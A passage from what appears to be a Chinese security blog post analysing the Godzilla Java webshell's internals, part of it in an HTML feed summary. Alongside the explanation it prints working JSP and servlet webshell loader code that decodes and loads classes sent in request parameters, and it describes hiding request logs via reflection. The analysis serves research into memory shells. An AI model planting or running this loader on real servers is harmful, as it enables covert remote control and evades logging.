title="f.equals(data)"></a><code>f.equals(data)</code></h4><p>data是哥斯拉客户端传递给服务端的数据，服务端先进行解密，然后进入<code>f.equals(data)</code>函数，然后进入<code>handle()</code>函数进行变量初始化操作：<br><img src="/2022/05/17/godzilla/11.png"><br>上述操作完成之后，进入<code>this.formatParameter()</code>函数，对上一步获取到的<code>this.requestData</code>解压缩之后循环判断哥斯拉传递过来的数据，最后放到<code>this.paramterMap</code>:<br><img src="/2022/05/17/godzilla/12.png"></p><p>第二次的<code>equals</code>完成了对哥斯拉传递过来数据的初始化，最终放到<code>this.paramterMap</code>保存。</p><h4 id="f-equals-req"><a href="#f-equals-req" class="headerlink" title="f.equals(req)"></a><code>f.equals(req)</code></h4><p><img src="/2022/05/17/godzilla/9.png"><br>第三次equals的时候执行<code>f.equals(req)</code>，进入到<code>handle()</code>函数，填充<code>this.servletRequest</code>对象：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">supportClass</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"%s.servlet.http.HttpServletRequest"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>servletRequest <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">supportClass</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"%s.servlet.ServletRequest"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>servletRequest <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进入<code>this.handlePayloadContext()</code>利用<code>payload.class</code>里面定义好的反射函数，获取<code>servletRequest</code>, <code>servletContext</code>, <code>httpSession</code>对象，然后填充给payload变量：<br><code>this.servletRequest</code>、<code>this.servletContext</code>、<code>this.httpSession</code>。</p><p>继续跟进判断<code>this.servletRequest</code>不为空的时候，尝试获取<code>servletRequest</code>里面的<code>parameters</code>对象，经过判断之后赋给<code>this.requestData</code>。<br><img src="/2022/05/17/godzilla/13.png"></p><p>这里之所以又填充一次<code>this.requestData</code>变量，是为了兼容性考虑，比如在Spring里面直接写servlet，经过第二次的<code>equals()</code>就填充了<code>this.requestData</code>对象，但是在JSP里面，是利用<br><code>request.setAttribute(&quot;parameters&quot;, data);</code>来走到上面这一步填充<code>this.requestData</code>对象，这也是哥斯拉对servlet没有依赖的主要原因。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">  <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                Object f = payload.newInstance();</span>                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在JSP里面解析<code>pageContext</code>对象:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">X</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Q</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            request<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"parameters"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着会走到<code>nolog</code>里面，利用反射隐藏请求的日志。这里应该是只隐藏在tomcat下的日志，未测试。</p><h4 id="f-toString"><a href="#f-toString" class="headerlink" title="f.toString()"></a><code>f.toString()</code></h4><p>从<code>this.paramterMap</code>里面获取要执行的模块参数等变量，然后进入<code>this.run()</code>执行<code>payload.class</code>定义好的shell功能：<br><img src="/2022/05/17/godzilla/7.png"></p><p>第三次请求是调用了<code>methodNameClose</code>函数，不再分析。整个流程分析下来会发现哥斯拉一开始就把一个大马的功能实现发送到了服务端，之后的功能都是通过调用大马实现好的功能完成的。</p><p>至此Y4er师傅的文章算是看懂了：<a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题</a></p><p>在Spring里面的三个<code>equeals</code>:</p><ul><li>f.equals(arrOut) 必须的，使用ByteArrayOutputStream返回执行的结果</li><li>f.equals(data)   必须的，接收客户端传过来的参数</li><li>f.equals(req)    非必要，对于Spring的Servlet是非必要的，用于隐藏日志。</li></ul><p>所以在Spring里面的Servlet，第三个<code>equals</code>去掉不影响正常shell功能。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题</a></li><li><a href="https://mp.weixin.qq.com/s/lmL6XyWKClEmYgiVUspYYw">哥斯拉源码分析(二)jsp shell分析</a></li><li><a href="https://tttang.com/archive/1513/">Java反序列化注入冰蝎内存马相关踩坑笔记</a></li><li><a href="https://github.com/rebeyond/Behinder/issues/151">想尝试修改到Spring boot 内存马的支持中，而Spring没有pageContext对象</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;分析背景&quot;&gt;&lt;a href=&quot;#分析背景&quot; class=&quot;headerlink&quot; title=&quot;分析背景&quot;&gt;&lt;/a&gt;分析背景&lt;/h2&gt;&lt;p&gt;起源于&lt;code&gt;Y4er&lt;/code&gt;师傅发的两篇文章：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://tttang.com/archive/1513/&quot;&gt;Java反序列化注入冰蝎内存马相关踩坑笔记&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/&quot;&gt;解决哥斯拉内存马pagecontext的问题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对其中的原因比较好奇，所以尝试对哥斯拉做了一次原理分析，测试代码在&lt;a href=&quot;https://github.com/JKme/MemoryShellDemo&quot;&gt;MemoryShellDemo&lt;/a&gt;。文章可能有错误的地方，可以在&lt;a href=&quot;https://github.com/JKme/JKme.github.io/issues&quot;&gt;issue&lt;/a&gt;留言。&lt;/p&gt;
&lt;h2 id=&quot;运行原理&quot;&gt;&lt;a href=&quot;#运行原理&quot; class=&quot;headerlink&quot; title=&quot;运行原理&quot;&gt;&lt;/a&gt;运行原理&lt;/h2&gt;&lt;p&gt;从哥斯拉的源代码里面扣出来&lt;code&gt;godzilla\shells\payloads\java\assets\payload.classs&lt;/code&gt;文件，使用&lt;a href=&quot;https://github.com/leibnitz27/cfr&quot;&gt;https://github.com/leibnitz27/cfr&lt;/a&gt;反编译之后，在idea里面新建&lt;code&gt;payload.java&lt;/code&gt;文件，然后修改误报错，&lt;a href=&quot;https://gist.github.com/JKme/690c9562155c019570afd5ab06356658&quot;&gt;这里&lt;/a&gt;是反编译好之后的文件。&lt;code&gt;payload.java&lt;/code&gt;实现了大部分的shell操作，比如查看文件、执行命令、数据库连接等等&lt;/p&gt;
&lt;p&gt;新建一个&lt;code&gt;HelloServlet.java&lt;/code&gt;，用于动态调试：&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;basic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;annotation&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;WebServlet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServlet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServletRequest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServletResponse&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;net&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;URL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;net&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;URLClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token annotation punctuation&quot;&gt;@WebServlet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;helloServlet&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/hello&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HelloServlet&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HttpServlet&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; xc &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;3c6e0b8a9c15224a&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;//定义AES加解密的Key，哥斯拉会把返回的response也做一次加密&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; pass &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;pass&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       
    &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; md5 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pass &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; xc&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;//用于返回response在头和尾部插入标识符，头部取md5的前16位字符串，尾部取md5的后16位字符串&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; payload&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; ret &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;security&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;MessageDigest&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            m &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;security&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;MessageDigest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;MD5&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getBytes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            ret &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;math&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;BigInteger&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toUpperCase&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; ret&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;base64Encode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; bs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.util.Base64&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
